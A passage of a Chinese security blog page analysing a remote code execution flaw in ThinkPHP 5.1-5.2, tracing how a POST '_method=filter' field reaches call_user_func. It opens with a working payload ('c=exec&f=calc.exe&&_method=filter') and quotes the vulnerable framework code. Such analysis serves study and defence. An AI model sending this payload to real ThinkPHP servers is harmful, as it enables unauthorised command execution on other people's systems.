        <a data-url="http://yoursite.com/2019/10/08/Thinkphp-5-2-x-pop%E9%93%BE%E5%88%86%E6%9E%90/" data-id="ckabsu38q002dkkvr49aebqp7" class="article-share-link" data-share="baidu" data-title="Thinkphp 5.2.x pop链分析">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/08/Thinkphp-5-2-x-pop%E9%93%BE%E5%88%86%E6%9E%90/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Thinkphp-5-1-5-2-RCE分析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/08/Thinkphp-5-1-5-2-RCE%E5%88%86%E6%9E%90/" class="article-date">
  <time datetime="2019-10-08T08:11:25.000Z" itemprop="datePublished">2019-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/08/Thinkphp-5-1-5-2-RCE%E5%88%86%E6%9E%90/">Thinkphp 5.1-5.2 RCE分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><a href="https://imgchr.com/i/edTNeP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/02/edTNeP.png" alt="edTNeP.png"></a></p>
<p>payload为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=exec&amp;f=calc.exe&amp;&amp;_method=filter</span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先需要在入口文件处关闭报错——<code>error_reporting(0)</code>，然后在入口处打一下断点跟进。问题出现在获取路由检测的地方</p>
<p><img src="https://s2.ax1x.com/2019/08/02/eBVSjH.png" alt="eBVSjH.png"></p>
<p>在这个地方接着打断点，开始自闭式跟进…<strong>（因为我不太清楚怎么去记录整个跟进的流程栈，所以只能疯狂自闭点击了，最后发现问题所在）</strong></p>
<p><img src="https://s2.ax1x.com/2019/08/02/eBVBUx.png" alt="eBVBUx.png"></p>
<p>跟进到了Domain类中的check方法，这里调用了request的类中的method方法，跟进去看一下，代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">method</span><span class="params">($method = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $method) &#123;</span><br><span class="line">        <span class="comment">// 获取原始请求类型</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isCli() ? <span class="string">'GET'</span> : (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>]) ? <span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>] : $_SERVER[<span class="string">'REQUEST_METHOD'</span>]);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="keyword">$this</span>-&gt;method) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="keyword">$this</span>-&gt;config-&gt;get(<span class="string">'var_method'</span>)])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = strtoupper($_POST[<span class="keyword">$this</span>-&gt;config-&gt;get(<span class="string">'var_method'</span>)]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_HTTP_METHOD_OVERRIDE'</span>])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = strtoupper($_SERVER[<span class="string">'HTTP_X_HTTP_METHOD_OVERRIDE'</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = <span class="keyword">$this</span>-&gt;isCli() ? <span class="string">'GET'</span> : (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>]) ? <span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>] : $_SERVER[<span class="string">'REQUEST_METHOD'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;method;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>问题就出现在这个<code>var_method</code>是可控字段，由post来控制，绑定如下：</p>
<p><img src="https://s2.ax1x.com/2019/08/02/eBKlVJ.png" alt="eBKlVJ.png"></p>
<p>也就是说我们可以通过post所传参的字段来控制<code>$this-&gt;method</code>的值，接下来跟着如下代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br></pre></td></tr></table></figure>

<p>这样我们就可以调用任意方法了，在exp中给的是filter方法，跟进去看一下：</p>
<p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($filter = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($filter)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;filter;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter = $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以我们可以通过调用filter方法来对<code>Request</code>类中的filter变量在进行覆盖，覆盖后<code>$this-&gt;filter</code>的值就变成了我们传递的post数组了。</p>
<p>接下来执行代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$method = strtolower($request-&gt;method());</span><br><span class="line">$rules  = array_merge(<span class="keyword">$this</span>-&gt;rules[<span class="string">'*'</span>], <span class="keyword">$this</span>-&gt;rules[$method]);</span><br></pre></td></tr></table></figure>

<p>不过这里的$method方法是我们通过method方法覆盖过的，所以此时的$method的值其实是filter，但是我们也可以从上面图片中看到rules数组中是没有filter字段的，所以如果直接去执行exp的回显是如下情况的：</p>
<p><img src="https://s2.ax1x.com/2019/08/02/eBQMN9.png" alt="eBQMN9.png"></p>
<p>则会直接报错，所以我们在前面是需要关闭报错的，这样exp才能正常的执行。</p>
<p>当报错关闭后，这个调用method方法后产生的结果就会成功的出来了，也就是在request类中成功产生的赋值，效果如下：</p>
<p><img src="https://s2.ax1x.com/2019/08/03/eBReK0.png" alt="eBReK0.png"></p>
<p><img src="https://s2.ax1x.com/2019/08/03/eBR3G9.png" alt="eBR3G9.png"></p>
<p>之前我们说到的是调用<code>routecheck</code>方法后会产生method方法的调用过程进而导致我们所传递的值都进行了赋予，那么我们回到app类，接着向下跟进</p>
<p><img src="https://s2.ax1x.com/2019/08/03/eBRNqK.png" alt="eBRNqK.png"></p>
<p>由图可见，在调用完<code>routecheck</code>方法后，判断是否有debug，然后进入if语句，这里我们的debug是开了的，所以可以进入下一处漏洞点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;request-&gt;param()</span><br></pre></td></tr></table></figure>

<p>跟进param方法，代码如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;param)) &#123;</span><br><span class="line">        $method = <span class="keyword">$this</span>-&gt;method(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 自动获取请求变量</span></span><br><span class="line">        <span class="keyword">switch</span> ($method) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'POST'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;post(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PUT'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'DELETE'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PATCH'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;put(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                $vars = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $name) &#123;</span><br><span class="line">        <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">        $file = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">        $data = is_array($file) ? array_merge(<span class="keyword">$this</span>-&gt;param, $file) : <span class="keyword">$this</span>-&gt;param;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input($data, <span class="string">''</span>, $default, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为我们的$this-&gt;param并没有赋值，所以直接进入了method方法，代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">method</span><span class="params">($method = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $method) &#123;</span><br><span class="line">        <span class="comment">// 获取原始请求类型</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isCli() ? <span class="string">'GET'</span> : (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>]) ? <span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>] : $_SERVER[<span class="string">'REQUEST_METHOD'</span>]);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="keyword">$this</span>-&gt;method) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="keyword">$this</span>-&gt;config-&gt;get(<span class="string">'var_method'</span>)])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = strtoupper($_POST[<span class="keyword">$this</span>-&gt;config-&gt;get(<span class="string">'var_method'</span>)]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_HTTP_METHOD_OVERRIDE'</span>])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = strtoupper($_SERVER[<span class="string">'HTTP_X_HTTP_METHOD_OVERRIDE'</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = <span class="keyword">$this</span>-&gt;isCli() ? <span class="string">'GET'</span> : (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>]) ? <span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>] : $_SERVER[<span class="string">'REQUEST_METHOD'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;method;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为这里我们传入的method方法的参数为True，所以直接进入了第一个If然后就return值了，下面之前我们之前利用过的漏洞点是进不去的,也就是这个method方法实际上就是去获得我们的请求类型的，然后再回到param方法，接着向下走</p>
<p><a href="https://imgchr.com/i/eBWv0f" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eBWv0f.png" alt="eBWv0f.png"></a></p>
<p>可以看到我们的method方法获得的值为post，然后通过switch跟进post方法，这里要注意看一下我们的参数是false，post方法代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">post</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;post)) &#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;input;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($_POST) &amp;&amp; <span class="keyword">false</span> !== strpos(<span class="keyword">$this</span>-&gt;contentType(), <span class="string">'application/json'</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;post = (<span class="keyword">array</span>) json_decode($content, <span class="keyword">true</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;post = $_POST;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;param       = [];</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;post = array_merge(<span class="keyword">$this</span>-&gt;post, $name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;post, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们是直接进入了else条件，给我们的post变量赋值了我们传入进去的post数组，接着跟进return的input方法，代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === $name) &#123;</span><br><span class="line">        <span class="comment">// 获取原始数据</span></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $name = (string) $name;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">''</span> != $name) &#123;</span><br><span class="line">        <span class="comment">// 解析name</span></span><br><span class="line">        <span class="keyword">if</span> (strpos($name, <span class="string">'/'</span>)) &#123;</span><br><span class="line">            <span class="keyword">list</span>($name, $type) = explode(<span class="string">'/'</span>, $name);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $type = <span class="string">'s'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 按.拆分成多维数组进行判断</span></span><br><span class="line">        <span class="keyword">foreach</span> (explode(<span class="string">'.'</span>, $name) <span class="keyword">as</span> $val) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($data[$val])) &#123;</span><br><span class="line">                $data = $data[$val];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 无输入数据，返回默认值</span></span><br><span class="line">                <span class="keyword">return</span> $default;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_object($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析过滤器</span></span><br><span class="line">    $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">        array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">        reset($data);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($type) &amp;&amp; $data !== $default) &#123;</span><br><span class="line">        <span class="comment">// 强制类型转换</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;typeCast($data, $type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是这里因为我们传入的是false，所以只能进入第一步if，返回了我们的$this-&gt;post。接着回到app类，继续跟进，这里将我们的$this-&gt;post的值赋给了我们的vars变量，下一步代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br></pre></td></tr></table></figure>

<p>这里给Request类中的$this-&gt;param进行了一次赋值，进行了数组合并，不过get和route都是空的，所以$this-&gt;param其实就是我们的post数组，接着向下跟进，再次调用了input方法。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br></pre></td></tr></table></figure>

<p>继续跟进input方法，这次我们并没有false的阻碍，可以向下继续跟进</p>
<p><img src="https://s2.ax1x.com/2019/08/03/eB4Szj.png" alt="eB4Szj.png"></p>
<p>首先发现进入了getfilter方法，跟进一下，其实就是把我们的$this-&gt;filter赋值给filter。所以可见上图变量中的数据。接着跟进<code>array_walk_recursive</code>方法，看一下手册的描述</p>
<p><img src="https://s2.ax1x.com/2019/08/03/eB4gpQ.png" alt="eB4gpQ.png"></p>
<p>看一下例子就会很明白了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">$sweet = <span class="keyword">array</span>(<span class="string">'a'</span> =&gt; <span class="string">'apple'</span>, <span class="string">'b'</span> =&gt; <span class="string">'banana'</span>);</span><br><span class="line">$fruits = <span class="keyword">array</span>(<span class="string">'sweet'</span> =&gt; $sweet, <span class="string">'sour'</span> =&gt; <span class="string">'lemon'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_print</span><span class="params">($item, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$key holds $item\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array_walk_recursive($fruits, <span class="string">'test_print'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里调用的是filterValue方法，跟进看一下</p>
<p><img src="https://s2.ax1x.com/2019/08/03/eB4okT.png" alt="eB4okT.png"></p>
<p>这里看到了关键函数<code>call_user_func</code>，而且这个函数的两个参数我们还都可以控制</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$value----<span class="keyword">$this</span>-&gt;param</span><br><span class="line"></span><br><span class="line">$filter----<span class="keyword">$this</span>-&gt;filter</span><br></pre></td></tr></table></figure>

<p>最终可以经过不断遍历达到命令执行的目的</p>
<p><img src="https://s2.ax1x.com/2019/08/03/eB5SAK.png" alt="eB5SAK.png"></p>
<p>最终如本文开头成功弹出计算器。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>攻击链如下</p>
<p><img src="https://s2.ax1x.com/2019/08/03/eBItsA.png" alt="eBItsA.png"></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/10/08/Thinkphp-5-1-5-2-RCE%E5%88%86%E6%9E%90/" data-id="ckabsu38o0029kkvrawc95u7z" class="article-share-link" data-share="baidu" data-title="Thinkphp 5.1-5.2 RCE分析">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/08/Thinkphp-5-1-5-2-RCE%E5%88%86%E6%9E%90/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
  </nav>
</section>
      
      <aside id="sidebar">
  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">30</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB%E5%AE%89%E5%85%A8/" rel="tag">WEB安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a><span class="tag-list-count">26</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/" rel="tag">生活随笔</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a><span class="tag-list-count">1</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 12.5px;">Crypto</a> <a href="/tags/WEB%E5%AE%89%E5%85%A8/" style="font-size: 10px;">WEB安全</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 17.5px;">Web安全</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">生活随笔</a> <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">随笔</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a><span class="archive-list-count">21</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
